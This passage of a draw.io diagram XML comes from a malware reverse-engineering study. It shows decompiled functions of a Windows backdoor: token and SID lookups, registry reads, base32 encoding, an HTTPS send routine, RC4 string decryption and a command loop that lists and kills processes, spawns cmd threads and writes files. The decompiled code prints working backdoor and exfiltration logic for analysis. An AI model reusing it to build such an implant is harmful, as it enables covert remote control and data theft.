__int16)(customSystemDescriptionLength - 1));&#xa;  return &amp;ProcessorTypeEndPoint[(unsigned __int16)(customSystemDescriptionLength - 1) - outputBuffer];&#xa;}" style="text;whiteSpace=wrap;" parent="1" vertex="1">
          <mxGeometry x="-1590" y="1435" width="500" height="1510" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-40" value="&lt;h1&gt;&lt;font color=&quot;#00cc00&quot;&gt;Function 3: sub_4027A0() (processInputNumberAndSetString))&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-370" y="160" width="470" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-41" value="char *__stdcall GetAccountNameAndDomainViaSid(char *recipientDomain, char *accountName)&#xa;{&#xa;  HANDLE activeThread; // eax&#xa;  char *operationResult; // eax&#xa;  HANDLE activeProcess; // eax&#xa;  HANDLE accessHandle; // [esp+0h] [ebp-614h] BYREF&#xa;  DWORD accountNameSize; // [esp+4h] [ebp-610h] BYREF&#xa;  DWORD recipientDomainSize; // [esp+8h] [ebp-60Ch] BYREF&#xa;  DWORD tokenInfo; // [esp+Ch] [ebp-608h] BYREF&#xa;  enum _SID_NAME_USE accountType; // [esp+10h] [ebp-604h] BYREF&#xa;  CHAR sourceDomain[253]; // [esp+14h] [ebp-600h] BYREF&#xa;  __int16 sourceTrailingSize; // [esp+111h] [ebp-503h]&#xa;  char sourceTrailingChar; // [esp+113h] [ebp-501h]&#xa;  CHAR accountNameBuffer[253]; // [esp+114h] [ebp-500h] BYREF&#xa;  __int16 bufferTrailingSize; // [esp+211h] [ebp-403h]&#xa;  char bufferTrailingChar; // [esp+213h] [ebp-401h]&#xa;  PSID securityIdentifier[256]; // [esp+214h] [ebp-400h] BYREF&#xa;&#xa;  memset(securityIdentifier, 0, sizeof(securityIdentifier));&#xa;  memset(accountNameBuffer, 0, sizeof(accountNameBuffer));&#xa;  memset(sourceDomain, 0, sizeof(sourceDomain));&#xa;  bufferTrailingSize = 0;&#xa;  bufferTrailingChar = 0;&#xa;  sourceTrailingSize = 0;&#xa;  sourceTrailingChar = 0;&#xa;  recipientDomainSize = 256;&#xa;  accountNameSize = 256;&#xa;  activeThread = GetCurrentThread();&#xa;  if ( OpenThreadToken(activeThread, 8u, 1, &amp;accessHandle)&#xa;    || (operationResult = (char *)GetLastError(), operationResult == (char *)1008)&#xa;    &amp;&amp; (activeProcess = GetCurrentProcess(),&#xa;        (operationResult = (char *)OpenProcessToken(activeProcess, 8u, &amp;accessHandle)) != 0) )&#xa;  {&#xa;    operationResult = (char *)GetTokenInformation(accessHandle, TokenUser, securityIdentifier, 0x400u, &amp;tokenInfo);&#xa;    if ( operationResult )&#xa;    {&#xa;      operationResult = (char *)LookupAccountSidA(&#xa;                                  0,&#xa;                                  securityIdentifier[0],&#xa;                                  accountNameBuffer,&#xa;                                  &amp;recipientDomainSize,&#xa;                                  sourceDomain,&#xa;                                  &amp;accountNameSize,&#xa;                                  &amp;accountType);&#xa;      if ( operationResult )&#xa;      {&#xa;        strncpy(recipientDomain, sourceDomain, 0x3Fu);&#xa;        return strncpy(accountName, accountNameBuffer, 0x3Fu);&#xa;      }&#xa;    }&#xa;  }&#xa;  return operationResult;&#xa;}" style="text;whiteSpace=wrap;" parent="1" vertex="1">
          <mxGeometry x="-2500" y="1815" width="560" height="860" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-43" value="&lt;h1&gt;&lt;font color=&quot;#47e7ff&quot;&gt;Function 4.1: sub_403220() (GetAccountNameAndDomainViaSid):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-2510" y="1720" width="550" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-45" value="void __stdcall QueryAndAppendRegistryValueAndStatus(char *outputBuffer)&#xa;{&#xa;  void *registryValueMemory; // ebx&#xa;  const char *statusText; // edi&#xa;  HKEY registryKey; // [esp+Ch] [ebp-10h] BYREF&#xa;  DWORD sizeOfRegistryValue; // [esp+10h] [ebp-Ch] BYREF&#xa;  DWORD sizeOfStatus; // [esp+14h] [ebp-8h] BYREF&#xa;  BYTE statusBuffer[4]; // [esp+18h] [ebp-4h] BYREF&#xa;&#xa;  registryKey = HKEY_CURRENT_USER;&#xa;  if ( RegOpenKeyExA(HKEY_CURRENT_USER, SubKey, 0, 1u, &amp;registryKey) )&#xa;  {&#xa;    RegCloseKey(registryKey);&#xa;    return;&#xa;  }&#xa;  sizeOfRegistryValue = 0;&#xa;  if ( !RegQueryValueExA(registryKey, ValueName, 0, 0, 0, &amp;sizeOfRegistryValue) )&#xa;  {&#xa;    registryValueMemory = operator new(sizeOfRegistryValue);&#xa;    memset(registryValueMemory, 0, sizeOfRegistryValue);&#xa;    if ( !RegQueryValueExA(registryKey, ValueName, 0, 0, (LPBYTE)registryValueMemory, &amp;sizeOfRegistryValue)&#xa;      &amp;&amp; !RegQueryValueExA(registryKey, A8h, 0, 0, 0, &amp;sizeOfRegistryValue) )&#xa;    {&#xa;      sizeOfStatus = 4;&#xa;      if ( !RegQueryValueExA(registryKey, A8h, 0, 0, statusBuffer, &amp;sizeOfStatus) )&#xa;      {&#xa;        strcat(outputBuffer, (const char *)registryValueMemory);&#xa;        if ( *(_DWORD *)statusBuffer )&#xa;        {&#xa;          if ( *(_DWORD *)statusBuffer != 1 )&#xa;          {&#xa;LABEL_12:&#xa;            operator delete(registryValueMemory);&#xa;            return;&#xa;          }&#xa;          statusText = On;&#xa;        }&#xa;        else&#xa;        {&#xa;          statusText = Off;&#xa;        }&#xa;        strcat(outputBuffer, statusText);&#xa;        goto LABEL_12;&#xa;      }&#xa;    }&#xa;  }&#xa;}" style="text;whiteSpace=wrap;" parent="1" vertex="1">
          <mxGeometry x="-2480" y="2910" width="450" height="700" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-47" value="&lt;h1&gt;&lt;font color=&quot;#47e7ff&quot;&gt;Function 4.2: sub_403360() (QueryAndAppendRegistryValueAndStatus):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-2490" y="2815" width="520" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-49" value="int __stdcall SprintFFunction(char *Buffer)&#xa;{&#xa;  return sprintf(Buffer, &quot;%s%u&quot;, asc_4073E8, dword_407624);&#xa;}" style="text;whiteSpace=wrap;" parent="1" vertex="1">
          <mxGeometry x="-440" y="1180" width="370" height="80" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-51" value="&lt;h1&gt;&lt;font color=&quot;#00cc00&quot;&gt;Function 5: sub_402950() (prepare_and_write_message_to_buffer)):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-450" y="1090" width="550" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-53" value="int __cdecl base32_encode(_BYTE *inputBuffer1, _BYTE *inputBuffer2, unsigned int formatted_system_info_ptr)&#xa;{&#xa;  _BYTE *currentByte1; // ecx&#xa;  _BYTE *currentByte2; // esi&#xa;  unsigned int remainingBytes; // ebp&#xa;  char bitCache1; // al&#xa;  char bitCache2; // dl&#xa;  char bitShift; // bl&#xa;  unsigned __int8 byteValue; // al&#xa;  _BYTE *nextByte1; // ecx&#xa;  int outputBytes; // eax&#xa;  unsigned __int8 byte1; // [esp+4h] [ebp-1Ch]&#xa;  unsigned __int8 byte2; // [esp+8h] [ebp-18h]&#xa;  unsigned __int8 byte3; // [esp+Ch] [ebp-14h]&#xa;  unsigned __int8 byte4; // [esp+10h] [ebp-10h]&#xa;  int processedBytes; // [esp+14h] [ebp-Ch]&#xa;  unsigned __int8 byte1Buffer; // [esp+18h] [ebp-8h]&#xa;  unsigned __int8 byte2Buffer; // [esp+1Ch] [ebp-4h]&#xa;  unsigned __int8 byte3Buffer; // [esp+24h] [ebp+4h]&#xa;  unsigned int inputBufferLength; // [esp+28h] [ebp+8h]&#xa;  unsigned __int8 byte5Buffer; // [esp+2Ch] [ebp+Ch]&#xa;&#xa;  currentByte1 = inputBuffer1;&#xa;  if ( !inputBuffer1 )&#xa;    return 0;&#xa;  currentByte2 = inputBuffer2;&#xa;  if ( !inputBuffer2 )&#xa;    return 0;&#xa;  remainingBytes = formatted_system_info_ptr;&#xa;  inputBufferLength = formatted_system_info_ptr;&#xa;  processedBytes = 0;&#xa;  if ( formatted_system_info_ptr )&#xa;  {&#xa;    while ( 1 )&#xa;    {&#xa;      if ( remainingBytes &gt;= 5 )&#xa;        remainingBytes = 5;&#xa;      bitCache1 = 0;&#xa;      bitCache2 = 0;&#xa;      bitShift = 0;&#xa;      byte4 = 0;&#xa;      byte3Buffer = 0;&#xa;      byte3 = 0;&#xa;      byte2 = 0;&#xa;      byte1 = 0;&#xa;      byte5Buffer = 0;&#xa;      byte2Buffer = 0;&#xa;      byte1Buffer = 0;&#xa;      switch ( remainingBytes )&#xa;      {&#xa;        case 1u:&#xa;          goto LABEL_13;&#xa;        case 2u:&#xa;          goto LABEL_12;&#xa;        case 3u:&#xa;          goto LABEL_11;&#xa;        case 4u:&#xa;          goto LABEL_10;&#xa;        case 5u:&#xa;          byte4 = currentByte2[4] &amp; 0x1F;&#xa;          byte3Buffer = currentByte2[4] &gt;&gt; 5;&#xa;LABEL_10:&#xa;          byte3Buffer |= 8 * (currentByte2[3] &amp; 3);&#xa;          byte3 = (currentByte2[3] &gt;&gt; 2) &amp; 0x1F;&#xa;          bitCache1 = currentByte2[3] &gt;&gt; 7;&#xa;LABEL_11:&#xa;          byte2 = (2 * (currentByte2[2] &amp; 0xF)) | bitCache1;&#xa;          bitCache2 = currentByte2[2] &gt;&gt; 4;&#xa;LABEL_12:&#xa;          byteValue = currentByte2[1];&#xa;          byte1 = (16 * (byteValue &amp; 1)) | bitCache2;&#xa;          byte5Buffer = (byteValue &gt;&gt; 1) &amp; 0x1F;&#xa;          bitShift = byteValue &gt;&gt; 6;&#xa;LABEL_13:&#xa;          byte2Buffer = (4 * (*currentByte2 &amp; 7)) | bitShift;&#xa;          byte1Buffer = *currentByte2 &gt;&gt; 3;&#xa;          break;&#xa;        default:&#xa;          break;&#xa;      }&#xa;      currentByte2 += remainingBytes;&#xa;      inputBufferLength -= remainingBytes;&#xa;      switch ( remainingBytes )&#xa;      {&#xa;        case 1u:&#xa;          byte1 = 32;&#xa;          byte5Buffer = 32;&#xa;          goto LABEL_16;&#xa;        case 2u:&#xa;LABEL_16:&#xa;          byte2 = 32;&#xa;          goto LABEL_17;&#xa;        case 3u:&#xa;LABEL_17:&#xa;          byte3Buffer = 32;&#xa;          byte3 = 32;&#xa;          goto LABEL_18;&#xa;        case 4u:&#xa;LABEL_18:&#xa;          byte4 = 32;&#xa;          break;&#xa;        default:&#xa;          break;&#xa;      }&#xa;      nextByte1 = currentByte1 + 1;&#xa;      *(nextByte1++ - 1) = MEMORY[0x407020][byte1Buffer];&#xa;      *(nextByte1++ - 1) = MEMORY[0x407020][byte2Buffer];&#xa;      *(nextByte1++ - 1) = MEMORY[0x407020][byte5Buffer];&#xa;      *(nextByte1++ - 1) = MEMORY[0x407020][byte1];&#xa;      *(nextByte1++ - 1) = MEMORY[0x407020][byte2];&#xa;      *(nextByte1++ - 1) = MEMORY[0x407020][byte3];&#xa;      *(nextByte1 - 1) = MEMORY[0x407020][byte3Buffer];&#xa;      currentByte1 = nextByte1 + 1;&#xa;      *(currentByte1 - 1) = MEMORY[0x407020][byte4];&#xa;      processedBytes += 8;&#xa;      if ( !inputBufferLength )&#xa;        break;&#xa;      remainingBytes = inputBufferLength;&#xa;    }&#xa;  }&#xa;  outputBytes = processedBytes;&#xa;  *currentByte1 = 0;&#xa;  return outputBytes;&#xa;}" style="text;whiteSpace=wrap;" parent="1" vertex="1">
          <mxGeometry x="-639" y="1540" width="649" height="1820" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-56" value="&lt;h1&gt;&lt;font color=&quot;#ff8b26&quot;&gt;Function 6: sub_401160() (base32_encode):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-639" y="1480" width="659" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-59" value="int __stdcall format_and_append_strings(char *Buffer, int a2, const char *a3)&#xa;{&#xa;  int result; // eax&#xa;&#xa;  sprintf(Buffer, YF, a2);&#xa;  result = 0;&#xa;  strcat(Buffer, aRf8t69mIWm);&#xa;  strcat(Buffer, aPj);&#xa;  strcat(Buffer, aDz);&#xa;  strcat(Buffer, aPj_0);&#xa;  strcat(Buffer, aPj_1);&#xa;  strcat(Buffer, aRfX0wEtbUqP3);&#xa;  strcat(Buffer, a3);&#xa;  strcat(Buffer, asc_407478);&#xa;  return result;&#xa;}" style="text;whiteSpace=wrap;" parent="1" vertex="1">
          <mxGeometry x="-575" y="3570" width="380" height="250" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-62" value="&lt;h1&gt;&lt;font color=&quot;#00cc00&quot;&gt;Function 7: sub_402A50() (format_and_append_strings):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-583" y="3480" width="433" height="70" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-16" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.25;exitDx=0;exitDy=0;entryX=1;entryY=0.75;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-71" target="IVjEpb5pE-T4-foRiEZy-66">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="1940" y="4262" />
              <mxPoint x="1940" y="3130" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-20" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-71" target="M72Y2Jye1D7dT9Ai017H-19">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-21" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.25;exitDx=0;exitDy=0;entryX=0.75;entryY=1;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-71" target="IVjEpb5pE-T4-foRiEZy-7">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="2030" y="4262" />
              <mxPoint x="2030" y="1386" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-41" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0.25;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-71" target="M72Y2Jye1D7dT9Ai017H-38">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-71" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="920" y="3920" width="670" height="1370" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-66" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="910" y="1480" width="840" height="2200" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-65" value="int __thiscall SendDataOverSecureSocket(&#xa;        int socketInterface,&#xa;        int dataToSend,&#xa;        int desiredSocketConfiguration,&#xa;        int socketOptionLevelFlag,&#xa;        int currentBytesSent,&#xa;        int totalDataLength,&#xa;        _DWORD *dataSentCounter)&#xa;{&#xa;  int socketHandle; // ebx&#xa;  int socketConnectionStatus; // eax&#xa;  int connectedSocketHandle; // ebp&#xa;  int initialDataSendStatus; // eax&#xa;  int initialBatchDataSent; // edi&#xa;  int iterationDataSent; // ebx&#xa;  int remainingDataToSend; // ebp&#xa;  int currentIterationDataSent; // [esp+ACh] [ebp-Ch] BYREF&#xa;  int socketTimeout; // [esp+B0h] [ebp-8h] BYREF&#xa;  int finalSocketHandle; // [esp+B4h] [ebp-4h]&#xa;&#xa;  socketHandle = (*(int (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(socketInterface + 4))(0, 0, 0, 0, 0);&#xa;  finalSocketHandle = socketHandle;&#xa;  if ( socketHandle )&#xa;  {&#xa;    socketTimeout = 20000;&#xa;    if ( (*(int (__stdcall **)(int, int, int *, int))(socketInterface + 8))(socketHandle, 2, &amp;socketTimeout, 4) )&#xa;    {&#xa;      socketConnectionStatus = (*(int (__stdcall **)(int, int, int, _DWORD, _DWORD, int, _DWORD, _DWORD))(socketInterface + 12))(&#xa;                                 socketHandle,&#xa;                                 desiredSocketConfiguration,&#xa;                                 443,&#xa;                                 0,&#xa;                                 0,&#xa;                                 3,&#xa;                                 0,&#xa;                                 0);&#xa;      connectedSocketHandle = socketConnectionStatus;&#xa;      socketTimeout = socketConnectionStatus;&#xa;      if ( socketConnectionStatus )&#xa;      {&#xa;        initialDataSendStatus = (*(int (__stdcall **)(int, void *, int, void *, _DWORD, _DWORD, int, _DWORD))(socketInterface + 16))(&#xa;                                  socketConnectionStatus,&#xa;                                  &amp;unk_4071D4,&#xa;                                  socketOptionLevelFlag,&#xa;                                  &amp;unk_4071E0,&#xa;                                  0,&#xa;                                  0,&#xa;                                  13119488,&#xa;                                  0);&#xa;        initialBatchDataSent = initialDataSendStatus;&#xa;        if ( initialDataSendStatus )&#xa;        {&#xa;          if ( (*(int (__stdcall **)(int, int, int, _DWORD, _DWORD))(socketInterface + 20))(&#xa;                 initialDataSendStatus,&#xa;                 dataToSend,&#xa;                 -1,&#xa;                 0,&#xa;                 0)&#xa;            || GetLastError() == 12045&#xa;            &amp;&amp; (socketOptionLevelFlag = 4,&#xa;                (*(void (__stdcall **)(int, int, int *, int *))(socketInterface + 24))(&#xa;                  initialBatchDataSent,&#xa;                  31,&#xa;                  &amp;desiredSocketConfiguration,&#xa;                  &amp;socketOptionLevelFlag),&#xa;                desiredSocketConfiguration |= 0x180u,&#xa;                (*(void (__stdcall **)(int, int, int *, int))(socketInterface + 8))(&#xa;                  initialBatchDataSent,&#xa;                  31,&#xa;                  &amp;desiredSocketConfiguration,&#xa;                  4),&#xa;                (*(int (__stdcall **)(int, int, int, _DWORD, _DWORD))(socketInterface + 20))(&#xa;                  initialBatchDataSent,&#xa;                  dataToSend,&#xa;                  -1,&#xa;                  0,&#xa;                  0)) )&#xa;          {&#xa;            iterationDataSent = currentBytesSent;&#xa;            remainingDataToSend = totalDataLength;&#xa;            for ( currentIterationDataSent = 0; ; *dataSentCounter += currentIterationDataSent )&#xa;            {&#xa;              Sleep(0x64u);&#xa;              iterationDataSent += currentIterationDataSent;&#xa;              if ( !(*(int (__stdcall **)(int, int, int, int *))(socketInterface + 32))(&#xa;                      initialBatchDataSent,&#xa;                      iterationDataSent,&#xa;                      remainingDataToSend,&#xa;                      &amp;currentIterationDataSent) )&#xa;              {&#xa;                GetLastError();&#xa;                (*(void (__stdcall **)(int))(socketInterface + 28))(finalSocketHandle);&#xa;                (*(void (__stdcall **)(int))(socketInterface + 28))(socketTimeout);&#xa;                (*(void (__stdcall **)(int))(socketInterface + 28))(initialBatchDataSent);&#xa;                return 0;&#xa;              }&#xa;              if ( !currentIterationDataSent )&#xa;                break;&#xa;              remainingDataToSend -= currentIterationDataSent;&#xa;            }&#xa;            (*(void (__stdcall **)(int))(socketInterface + 28))(initialBatchDataSent);&#xa;            (*(void (__stdcall **)(int))(socketInterface + 28))(socketTimeout);&#xa;            (*(void (__stdcall **)(int))(socketInterface + 28))(finalSocketHandle);&#xa;            return 1;&#xa;          }&#xa;          else&#xa;          {&#xa;            (*(void (__stdcall **)(int))(socketInterface + 28))(socketHandle);&#xa;            (*(void (__stdcall **)(int))(socketInterface + 28))(socketTimeout);&#xa;            (*(void (__stdcall **)(int))(socketInterface + 28))(initialBatchDataSent);&#xa;            return 0;&#xa;          }&#xa;        }&#xa;        else&#xa;        {&#xa;          GetLastError();&#xa;          (*(void (__stdcall **)(int))(socketInterface + 28))(socketHandle);&#xa;          (*(void (__stdcall **)(int))(socketInterface + 28))(connectedSocketHandle);&#xa;          (*(void (__stdcall **)(_DWORD))(socketInterface + 28))(0);&#xa;          return 0;&#xa;        }&#xa;      }&#xa;      else&#xa;      {&#xa;        GetLastError();&#xa;        (*(void (__stdcall **)(int))(socketInterface + 28))(socketHandle);&#xa;        (*(void (__stdcall **)(_DWORD))(socketInterface + 28))(0);&#xa;        return 0;&#xa;      }&#xa;    }&#xa;    else&#xa;    {&#xa;      GetLastError();&#xa;      (*(void (__stdcall **)(int))(socketInterface + 28))(socketHandle);&#xa;      return 0;&#xa;    }&#xa;  }&#xa;  else&#xa;  {&#xa;    GetLastError();&#xa;    (*(void (__stdcall **)(_DWORD))(socketInterface + 28))(0);&#xa;    return 0;&#xa;  }&#xa;}" style="text;whiteSpace=wrap;" parent="1" vertex="1">
          <mxGeometry x="970" y="1550" width="740" height="1720" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-67" value="&lt;h1&gt;&lt;font color=&quot;#ff0505&quot;&gt;Function 8: sub_4034D0() (SendDataOverSecureSocket):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="970" y="1490" width="760" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-70" value="int __stdcall RemoteCommandExecution(int command_code)&#xa;{&#xa;  int buffer_parameter[131]; // [esp-1F4h] [ebp-D30h] BYREF&#xa;  char *v3; // [esp+18h] [ebp-B24h]&#xa;  int totalBytesSent; // [esp+2Ch] [ebp-B10h] BYREF&#xa;  char v5[128]; // [esp+30h] [ebp-B0Ch] BYREF&#xa;  char socketOptionLevel[125]; // [esp+B0h] [ebp-A8Ch] BYREF&#xa;  __int16 v7; // [esp+12Dh] [ebp-A0Fh]&#xa;  char v8; // [esp+12Fh] [ebp-A0Dh]&#xa;  int Parameter[131]; // [esp+130h] [ebp-A0Ch] BYREF&#xa;  char bytesToSend[1024]; // [esp+33Ch] [ebp-800h] BYREF&#xa;  char sendData[1024]; // [esp+73Ch] [ebp-400h] BYREF&#xa;&#xa;  memset(sendData, 0, sizeof(sendData));&#xa;  memset(bytesToSend, 0, sizeof(bytesToSend));&#xa;  memset(v5, 0, sizeof(v5));&#xa;  memset(socketOptionLevel, 0, sizeof(socketOptionLevel));&#xa;  v7 = 0;&#xa;  totalBytesSent = 0;&#xa;  v8 = 0;&#xa;  while ( 1 )&#xa;  {&#xa;    memset(sendData, 0, sizeof(sendData));&#xa;    memset(bytesToSend, 0, sizeof(bytesToSend));&#xa;    FormatCurrentSystemTimeToString(socketOptionLevel);&#xa;    create_http_header_string(sendData, (int)socketFlag, v5);&#xa;    strcpy(v5, socketFlag);&#xa;    strcat(v5, socketOptionLevel);&#xa;    if ( !SendDataOverSecureSocket(&#xa;            dataBuffer,&#xa;            (int)sendData,&#xa;            (int)socketFlag,&#xa;            (int)socketOptionLevel,&#xa;            (int)bytesToSend,&#xa;            1024,&#xa;            &amp;totalBytesSent) )&#xa;      return -1;&#xa;    if ( !strcmp(bytesToSend, status_success) || !totalBytesSent )&#xa;    {&#xa;LABEL_4:&#xa;      pause_for_random_time(2000);&#xa;    }&#xa;    else&#xa;    {&#xa;      qmemcpy(Parameter, bytesToSend, sizeof(Parameter));&#xa;      RC4_Cipher_Processing(dataBuffer, (int)&amp;Parameter[3], 0x200u);&#xa;      switch ( Parameter[0] )&#xa;      {&#xa;        case 4:&#xa;          v3 = v5;&#xa;          qmemcpy(buffer_parameter, Parameter, sizeof(buffer_parameter));&#xa;          CollectAndSendProcessInformation();&#xa;          goto LABEL_4;&#xa;        case 5:&#xa;          v3 = v5;&#xa;          qmemcpy(buffer_parameter, Parameter, sizeof(buffer_parameter));&#xa;          TerminateProcessAndSendStatus(&#xa;            buffer_parameter[0],&#xa;            buffer_parameter[1],&#xa;            buffer_parameter[2],&#xa;            buffer_parameter[3]);&#xa;          goto LABEL_4;&#xa;        case 6:&#xa;          v3 = v5;&#xa;          qmemcpy(buffer_parameter, Parameter, sizeof(buffer_parameter));&#xa;          CreateThreadForCmd();&#xa;          goto LABEL_4;&#xa;        case 7:&#xa;          CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, Parameter, 0, 0);&#xa;          Sleep(0x1F4u);&#xa;          pause_for_random_time(2000);&#xa;          break;&#xa;        case 8:&#xa;          v3 = v5;&#xa;          qmemcpy(buffer_parameter, Parameter, sizeof(buffer_parameter));&#xa;          WriteWideStringToFile(&#xa;            buffer_parameter[0],&#xa;            buffer_parameter[1],&#xa;            buffer_parameter[2],&#xa;            (HANDLE)buffer_parameter[3]);&#xa;          goto LABEL_4;&#xa;        default:&#xa;          goto LABEL_4;&#xa;      }&#xa;    }&#xa;  }&#xa;}" style="text;whiteSpace=wrap;" parent="1" vertex="1">
          <mxGeometry x="990" y="4010" width="520" height="870" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-74" value="&lt;h1&gt;&lt;font color=&quot;#ff0505&quot;&gt;Function 9: sub_401C50() (RemoteCommandExecution // ExecuteSocketDataOperations is the same)&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="935" y="3930" width="680" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-18" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="2139" y="701" width="642" height="540" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-6" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="1420" y="290" width="649" height="1108.21" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-7" value="int __thiscall RC4DecryptAndLoadProcedures(int cipherBuffer)&lt;br&gt;{&lt;br&gt;&amp;nbsp; HMODULE loadedLibraryModule; // eax&lt;br&gt;&amp;nbsp; FARPROC procAddress; // eax&lt;br&gt;&amp;nbsp; FARPROC procAddress_1; // eax&lt;br&gt;&amp;nbsp; FARPROC procAddress_2; // eax&lt;br&gt;&amp;nbsp; FARPROC procAddress_3; // eax&lt;br&gt;&amp;nbsp; HMODULE loadedLibraryModule_Copy1; // [esp-Ch] [ebp-10h]&lt;br&gt;&amp;nbsp; HMODULE loadedLibraryModule_Copy2; // [esp-Ch] [ebp-10h]&lt;br&gt;&amp;nbsp; HMODULE loadedLibraryModule_Copy3; // [esp-Ch] [ebp-10h]&lt;br&gt;&amp;nbsp; HMODULE loadedLibraryModule_Copy4; // [esp-Ch] [ebp-10h]&lt;br&gt;&lt;br&gt;&amp;nbsp; *(_DWORD *)cipherBuffer = &amp;amp;off_405728;&lt;br&gt;&amp;nbsp; bufferByteShuffle((char *)cipherBuffer, (int)&amp;amp;unk_4070A8, 0x80u);&lt;br&gt;&lt;font color=&quot;#ff8b26&quot;&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)YF, 0xDu);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aRf8t69mIWm, 0x1Bu);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aPj, 0x10u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aDz, 0x77u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aPj_0, 0x23u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aPj_1, 0x39u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aRfX0wEtbUqP3, 0x14u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aRfT9W, 0x43u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)MEMORY[0x40736C], 0x24u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)SubKey, 0x40u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)ValueName, 0xCu);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)A8h, 0xCu);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)asc_4073E8, 0x1Fu);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)&amp;amp;unk_407408, 